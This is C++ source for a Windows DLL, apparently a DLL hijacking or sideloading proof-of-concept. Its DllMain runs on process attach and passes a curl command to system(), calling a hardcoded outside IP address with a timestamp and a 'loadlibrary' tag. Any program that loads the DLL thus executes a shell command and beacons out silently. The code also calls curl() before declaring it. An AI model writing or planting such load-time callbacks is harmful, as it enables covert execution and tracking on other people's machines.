#include "headers.h"
#include <Windows.h>
#include <string>
#include <ctime>
#include <iostream>

void get_url(std::string url);
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        std::cout << "use dll by DLL_PROCESS_ATTACH" << std::endl;
        curl(DLL_PROCESS_ATTACH);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void curl(int type) {
    std::string ip = "curl \"116.62.202.230";
    std::string uri;
    //     std::chrono::system_clock::time_point t = std::chrono::system_clock::now();
    //     auto as_time_t = std::chrono::system_clock::to_time_t(t);
    //     struct tm tm;
    // #if defined(WIN32) || defined(_WINDLL)
    //     localtime_s(&tm, &as_time_t);
    // #else
    //     localtime_r(&as_time_t, &tm);
    // #endif
    //     std::chrono::milliseconds ms = std::chrono::duration_cast<std::chrono::milliseconds>(t.time_since_epoch());
    std::time_t t = std::time(0);
    uri = std::to_string(t);
    switch (type) {
    case DLL_PROCESS_ATTACH:
        uri.append("&type=loadlibrary");
        break;

    default:
        uri.append("&type=fss");
        break;
    }

    get_url(ip.append("/?t=").append(uri).append("\""));
}

void get_url(std::string url) {
    std::cout << "url:" << url.c_str() << std::endl;
    system(url.c_str());
}